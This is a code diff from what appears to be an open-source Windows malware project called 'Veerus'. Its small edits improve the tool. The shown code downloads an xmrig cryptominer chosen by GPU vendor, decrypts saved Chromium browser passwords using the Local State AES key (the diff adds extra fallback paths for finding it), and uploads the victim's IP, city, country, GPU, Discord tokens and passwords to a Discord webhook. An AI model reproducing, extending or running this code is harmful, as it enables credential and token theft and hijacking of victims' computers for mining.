@@ -73,7 +73,6 @@ CUDA = False
 computer = wmi.WMI()
 
 GPUMODEL = computer.Win32_VideoController()[0]
-print()
 if("NVIDIA" in GPUMODEL.AdapterCompatibility):
 	MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrigcuda.zip?raw=true"
 	CUDA = True
@@ -333,7 +332,6 @@ if yes == "yes":
 		return win32crypt.CryptUnprotectData(
 		encryption_key, None, None, None, 0)[1]
 	def password_decryption(password, encryption_key):
-
 		try:
 			iv = password[3:15]
 			password = password[15:]
@@ -561,10 +559,12 @@ if yes == "yes":
 				print(i)
 				local_state_path = chromiumpaths[i]  + "\\Local State"
 				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
-					if not os.path.isfile(chromiumpaths[i] + "\\User Data"+ "\\Local State"):
-						continue
-					else:
-						local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
+					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
+					if not os.path.isfile(local_state_path):
+						local_state_path = chromiumpaths[i] +"\\User Data\\"+"\\Default\\" + "\\Local State"
+						if not os.path.isfile(local_state_path):
+							continue
+						
 				# get the AES key
 				key = get_encryption_key(local_state_path)
 				# local sqlite Chrome database path
@@ -750,7 +750,7 @@ if yes == "yes":
 		getfiles()
 		print("[.] Sending")
 		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
-		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card{GPUMODEL}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
+		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
 		webhook.add_embed(embed)
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
 		print("[.] Password : "+ main())
